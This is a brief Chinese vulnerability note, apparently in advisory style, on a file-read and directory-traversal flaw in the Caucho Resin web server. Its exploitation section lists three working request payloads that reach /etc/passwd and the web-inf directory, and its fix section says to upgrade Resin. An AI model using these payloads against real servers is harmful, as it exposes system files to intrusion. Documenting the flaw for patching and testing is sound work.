### 一 漏洞描述
Resin是CAUCHO公司的产品，是一个非常流行的支持servlets和jsp的引擎，速度非常快。Resin本身包含了一个支持HTTP/1.1的WEB服务器。它不仅可以显示动态内容，而且它显示静态内容的能力也非常强，速度直逼APACHESERVER。许多站点都是使用该WEB服务器构建的。
可以认为是一个WEB服务器  

### 二 漏洞利用
```
payload1 = "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd"
payload2 = "/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd"
payload3 = "/ ..\\\\web-inf"
```

### 三 漏洞修复
升级Resin到最新版本
